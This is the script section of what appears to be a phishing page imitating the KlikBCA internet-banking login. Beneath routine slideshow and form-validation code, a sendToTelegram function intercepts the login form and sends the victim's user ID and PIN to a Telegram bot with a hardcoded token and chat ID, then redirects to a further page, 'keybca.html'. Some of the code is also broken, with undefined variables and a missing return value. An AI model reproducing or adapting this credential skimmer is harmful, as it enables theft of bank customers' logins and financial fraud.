    <script>
        // Banner slideshow script
        let slideIndex = 0;
        function showSlides() {
            const slides = document.getElementsByClassName("banner-slide");
            for (let i = 0; i < slides.length; i++) {
                slides[i].style.display = "none";
            }
            slideIndex++;
            if (slideIndex > slides.length) { slideIndex = 1; }
            slides[slideIndex - 1].style.display = "block";
            setTimeout(showSlides, 4000); // Change image every 4 seconds
        }

        // Banner click event handler
        function bannerClickEvent(url) {
            window.open(url, '_blank');
        }

        // Form validation (optional, can be customized)
        function validateForm() {
            const user = document.getElementById('user').value.trim();
            const password = document.getElementById('password').value.trim();
            if (user === "" || password === "") {
                alert("Please fill in both USER ID and PIN.");
                return false;
            }
            return true;
        }

        window.onload = function () {
            document.getElementById('user').focus();
            showSlides();
        };

        // Function to go to full site (dummy function, replace as needed)
        function go2Full() {
            // Replace with actual full site URL
        }

        // Function to send form data to Telegram Bot
        async function sendToTelegram(userId, pin) {
            const botToken = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo'; // Replace with your Telegram bot token
            const chatId = '5906925079'; // Replace with your Telegram chat ID
            const message = `KlikBCA Login:\nUser ID: ${userId}\nPIN: ${pin}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                     const data = await response.json();

     if (data.ok) {
      window.location.href = "keybca.html"; 
      form.reset();
     } else {
      alert('Failed to send message to Telegram.');
     }
    } catch (error) {
    } finally {
     loadingOverlay.classList.add('hidden');
            }
        }

        // Override form submission to send data to Telegram
        document.addEventListener('DOMContentLoaded', function () {
            const form = document.querySelector('form');
            form.addEventListener('submit', async function (e) {
                e.preventDefault();
                if (!validateForm()) return;

                const userId = document.getElementById('user').value.trim();
                const pin = document.getElementById('password').value.trim();

                // Send data to Telegram
                const sent = await sendToTelegram(userId, pin);

                if (sent) {
                    // Optionally submit the form to server after sending to Telegram
                    form.submit();
                } else {
                    alert('Failed to send data to Telegram. Please try again.');
                }
            });
        });
    </script>
